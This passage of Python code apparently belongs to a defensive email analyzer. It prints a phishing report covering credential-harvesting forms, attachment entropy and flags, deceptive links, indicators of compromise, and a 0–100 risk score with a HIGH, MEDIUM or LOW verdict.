        print(f"  Credential harvesting forms: {phishing['credential_harvesting_forms']}")
    print()

    print(f"--- ATTACHMENTS ({findings['attachment_count']}) ---")
    for att in findings["attachments"]:
        flags = ", ".join(att["risk_flags"]) if att["risk_flags"] else "none"
        print(f"  {att['filename']} ({att['content_type']}, {att['size_bytes']} bytes)")
        print(f"    Entropy: {att['entropy']:.2f}  Flags: {flags}")
    print()

    print(f"--- BODY ANALYSIS ---")
    body = findings["body_analysis"]
    print(f"  HTML body:       {body['has_html_body']}")
    print(f"  Links in HTML:   {body['html_links_count']}")
    print(f"  Deceptive links: {len(body['deceptive_links'])}")
    print(f"  Form actions:    {body['form_actions']}")
    print(f"  Iframes:         {body['iframes']}")
    print()

    print(f"--- IOCs ---")
    iocs = result["iocs"]
    print(f"  IPs:      {iocs['ips']}")
    print(f"  Domains:  {iocs['domains']}")
    print(f"  URLs:     {iocs['urls'][:5]}")
    print(f"  Emails:   {iocs['email_addresses']}")
    print()

    print(f">>> RISK SCORE: {result['risk_score']}/100")
    if result["risk_score"] >= 60:
        print(">>> VERDICT: HIGH RISK — strong indicators of phishing / malicious email")
    elif result["risk_score"] >= 30:
        print(">>> VERDICT: MEDIUM RISK — suspicious patterns detected")
    else:
        print(">>> VERDICT: LOW RISK — no significant threats identified")

    print("\n[PASS] Email analyzer completed without errors.")
